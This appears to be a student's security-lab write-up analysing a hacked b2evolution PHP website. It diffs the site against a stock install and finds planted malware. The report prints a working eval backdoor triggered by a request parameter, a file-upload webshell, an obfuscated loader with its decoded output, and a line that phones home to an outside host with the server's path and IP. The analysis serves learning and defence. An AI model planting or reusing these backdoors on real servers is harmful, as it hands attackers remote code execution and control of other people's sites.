### Informational Security - Laboratory Work #3

Objectives
===============
- Examine the directory structure of a hacked web-site
- Find the pharma-store
- Find the malware
- Overcome the obfuscation techniques to see what the malware does
- Understand how the attack happened and what the attacker's objectives were


Malware Analysis 
================

After first dive into provided archive it was clear it is a PHP based application - a website.
After some more navigation I found out it represents a `b2evolution` CMS. It is present in *_functions_install.php*:
```
<?php
/**
 * This file implements support functions for the installer
 *
 * b2evolution - {@link http://b2evolution.net/}
 ...
```

Next step into finding the malware is to see what is different from the stock *b2evolution* CMS.
First we need the version. Running `grep version` command inside the site tree or a Sublime Text search will give us results:
```
conf/_application.php:
...
 $app_version = '4.0.5';
...
```

Now that we have both stock and hacked versions we can run a `diff` to see differences between folder containings:
```
Only in one-hacked: 400.shtml
Only in one-hacked: 401.shtml
Only in one-hacked: 403.shtml
Only in one-hacked: 404.shtml
Only in one-hacked: 500.php
Only in one-hacked: 500.shtml
Only in one-hacked: BingSiteAuth.xml
Only in one-hacked: a_noskin.php
Only in one-hacked: a_stub.php
Only in one-hacked: admin.php
Only in one-hacked: apple-touch-icon.png
Only in one-hacked: blog1.php
Only in one-hacked: blog2.php
Only in one-hacked: blog3.php
Only in one-hacked: blog4.php
Only in one-hacked: blog5.php
Only in one-hacked: blog6.php
Only in one-hacked: blog7.php
Only in b2evolution: blogs
...
```

Afer looking on the whole list it is not clear what is not ok. As I never run a php based CMS I started looking trough all files to find something that I could recognize.
First odd pattern was presence of `google.php` in more than 1 folder. It contains some strange php code and a lot of information about this specific website like the root folder, working folder, ip address etc. *Smells fishy.*

After a bit of interneting I found that in php `eval` is evil. I searched for some and found:
```
<?php
error_reporting(0);
eval("if(isset(\$_REQUEST['ch']) && (md5(\$_REQUEST['ch']) == '234a68e7dd9594b5fe0ce9a929b104ee') && isset(\$_REQUEST['php_code'])) { eval(stripslashes(\$_REQUEST['php_code'])); exit(); }");
?>
```

Serching the conent of `ch` variable I found out it is a known backdoor called *baskdoor*.

This variable is present in following files:
```
conf/_upgrade.php
cron/mms.php
inc/comments/model/_commentlist.class.php
inc/comments/views/_browse_comments.view.php
inc/files/views/_filetype_list.view.php
inc/plugins/views/_plugin_settings.form.php
inc/sessions/views/_goal_hitsummary.view.php
skins/_404_blog_not_found.main.php
skins/_atom/comments.main.php
skins/_rss2/index.main.php
skins/basic/_item_content.inc.php
```

Firs I tried to find a corelation between this code and google.php code. Unsuccesful.

Getting back to google.php and analyzing it carefully, there is a line that produce a javascript when accesed via webbrowser:
```
print "document.write('<script src=\"http://rusztiko.com/sh2.php?serverStr=$serverStr&req_type=add_site&document_root=$document_root&ip=$ip&domain='+window.location.hostname+'&uplUrl=$pp\"><\/script>');";
```

This writes to `ext.php` the generated code. The code looks like:
```
<?php error_reporting(0);
@ini_set("display_errors", 0);
$var = $_SERVER['PHP_SELF'] . "?";
$form = '<form enctype="multipart/form-data" action="' . $var . '" method="POST"><input name="uploadFile" type="file"/><br/><input type="submit" value="Upload" /></form>';
if (!empty($_FILES['uploadFile'])) {
    $self = dirname(__FILE__);
    move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $self . DIRECTORY_SEPARATOR . $_FILES["uploadFile"]["name"]);
    $time = filemtime($self);
    print "OK";
} else {
    print $form;
} ?>
```

This is a form. (`form`, `POST` method). It uploads files and it is surely for uploading malwares.

Another suspicious thign was some text that was actually code. 
This technique is called obfuscation:
```
<?php $ufcsafbt="tgmpgiamscuq"^"\x04\x15\x08\x178\x1b\x04\x1d\x1f\x02\x16\x14"; $bidjyvcisn="bhxfwpkefbrlct"^"M\x0e\x0b\x11\x16\x06\x07\x03I\x07";$ufcsafbt("$bidjyvcisn", "\x0b\x19\x11\x1a\x1b4\x14\x07\x19\x03\x19\x00\x08\x0f\x04J\x5bJY\x03\x15\x1b\x0eYJ\x08\x0dG\x10\x1a\x06\x08\x00\x5f\x3b\x3eL265\x29\x3a\x2f\x2a\x3b7F\x1a\x07E9\x5bB\x40OJN\x1e\x1cPJ\x2f\x2dQ\x2f\x2a2\x26\x3f\x24\x3f\x3c4Q\x05\x0b\x40\x3aKVTXNM\x5eB\x40\x11Y\x17\x11\x12\x0cX\x09H\x0c\x0dO\x14\x0cP\x1f\x40\x07VL\x5c\x5eTQF\x07\x16T\x15I\x5fFDKZ\x18\x04\x19\x07\x02Y5\x2dL\x2e\x2a\x23\x3c\x2f\x2f\x3f\x3d\x2fK\x1e\x05\x019\x0c\x08\x17\x0eK\x28QBL\x0fT\x08\x19\x0a\x1aN\x00\x19\x16\x11\x09\x10\x04\x0a\x1f\x09\x12\x0aF29F\x2b\x2a\x284\x27\x2f\x3c78N\x00\x1a\x034\x1b\x04\x13\x04N\x2bMY\x5dO\x14\x1a\x07\x10G\x5b\x5dI\x0dPD\x5c"^"nkcuikfbilktaacbkcbfczbqhakoyiumtwgbhmdpxojyolayobdrbfijfsxebsqupxwwjalhovfcggbvienjkvtporupjkkyhhvqhgywcdyjkaesercpnvfbmzqwjbvqiqhqxfmzjlitlnmqfogskluxklttmokvfsmdxychklawynnebtxmerjocciprskxkwaivdpfoqbndorfiprmg", "fswavlf"); ?>
```
Like what even is this? Code?

There are online tools like `unPHP` that can help decoding this "code".
The output is this:
```
<?php error_reporting(0);
eval("if(isset(\$_REQUEST['ch']) && (md5(\$_REQUEST['ch']) == '544a6edbf3b1de9ed7f7d2565545bd7e') && isset(\$_REQUEST['php_code'])) { eval(stripslashes(\$_REQUEST['php_code'])); exit(); }");
```
Aha! `eval` again. This is apparently same backdoor I found earlier. 
This is helping the bad guy to upload its files on the server.

Conlcusion
_________

Because of not knowing PHP frameworks at all it was quite challenging. Initially I was stuck about what to do and just went trough files and did not found much. Searching on internets helped. Also asking guys that knows some more stuff about it helped even more.
It is quite clear that a beginner would have troubles with security using popular CMS-es. That given, one should always learn and verify for security breaches, especially when dealing with some sensitive data.
